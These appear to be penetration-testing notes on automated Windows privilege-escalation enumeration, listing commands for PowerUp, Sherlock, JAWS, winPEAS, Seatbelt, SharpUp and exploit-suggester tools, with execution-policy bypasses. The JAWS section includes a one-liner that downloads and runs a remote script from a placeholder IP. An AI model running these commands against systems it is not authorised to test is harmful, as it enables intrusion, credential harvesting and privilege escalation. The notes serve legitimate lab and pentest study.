# enumeration auto

## Path fix

```powershell
set PATH=C:\Windows;C:\Windows\system32;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;%PATH%

Get-ExecutionPolicy -List
Set-ExecutionPolicy Unrestricted
```

## Check Arch, Process, Release ID

[get OS info from version](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-osversioninfoexa?redirectedfrom=MSDN#remarks)

```powershell
PS> [system.environment]::Is64BitOperatingSystem
PS> [system.environment]::Is64BitProcess
> echo %PROCESSOR_ARCHITECTURE%

PS > Get-ComputerInfo | select WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
PS> (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ReleaseId).ReleaseId
PS> (Get-WmiObject -class Win32_OperatingSystem).Caption
PS> [System.Environment]::OSVersion.Version
```

## [PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) | [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1) | [JAWS.ps1](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1) | [enjoiz-privesc.ps1](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1)

{% tabs %} {% tab title="PowerUp.ps1" %}

```powershell
# located at /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1

> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks -Format List}"
[OR]
PS> . .\PowerUp.ps1
PS> Invoke-AllChecks -Format List
```

{% endtab %}

{% tab title="Sherlock.ps1" %}

```powershell
> powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
[OR]
PS> . .\Sherlock.ps1
PS> Find-AllVulns
```

{% endtab %}

{% tab title="JAWS.ps1" %}

```powershell
# located at /opt/JAWS/jaws-enum.ps1

> powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('http://IP/jaws.ps1')
```

{% endtab %}

{% tab title="enjoiz-privesc.ps1" %}

```powershell
# located at /opt/Privesc/privesc.ps1
> powershell.exe -exec bypass -Command "& {Import-Module .\p.ps1; Invoke-Privesc -Groups 'Users,Everyone,Authenticated Users' -Whoami -Extended -Long}"
```

{% endtab %} {% endtabs %}

## [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) | [Seatbelt](https://github.com/GhostPack/Seatbelt) | [SharpUp](https://github.com/GhostPack/SharpUp)

{% tabs %} {% tab title="winPEAS" %}

```powershell
# need .NET 4.0
# cmd check
> dir /b %windir%\Microsoft.NET\Framework\v*
> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
> reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP\v4" /s

# check for .NET using PS
PS> cmd.exe /c dir /b %windir%\Microsoft.NET\Framework\v*
PS> Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version

winPEASany.exe quiet [cmd fast] [flag]
# systeminfo; userinfo; processinfo;
# servicesinfo; applicationsinfo; networkinfo;
# windowscreds; browserinfo; filesinfo; eventsinfo
```

{% endtab %}

{% tab title="Seatbelt" %}

```powershell
# located at /usr/share/windows-resources/Ghostpack-CompiledBinaries/

> .\Seatbelt.exe -group=[all | <check>] -outputfile="FULL-PATH"
```

{% endtab %}

{% tab title="SharpUp" %}

```powershell
# located at /usr/share/windows-resources/Ghostpack-CompiledBinaries/

> .\SharpUp.exe
```

{% endtab %} {% endtabs %}

## [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) | [wes-ng](https://github.com/bitsadmin/wesng)

{% tabs %} {% tab title="windows-exploit-suggester" %}

```bash
# needs python2
# copy .
# FIX: python2 -m pip install 'xlrd==1.2.0'

./windows-exploit-s.py --update
./windows-exploit-s.py -d <DB-FILE> -i <SYSTEMINFO.txt> [--hotfixes <>]

# if cannot get hotfixes using systeminfo
wmic qfe list full
```

{% endtab %}

{% tab title="wes-ng" %}

```bash
python3 /opt/wesng/wes.py sys.txt --update
python3 /opt/wesng/wes.py systeminfo.txt [--exploits-only] -o wes.csv
# --impact | -i "Remote Code Execution" | "Elevation of Privilege"
# --severity critical
```

{% endtab %} {% endtabs %}

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}
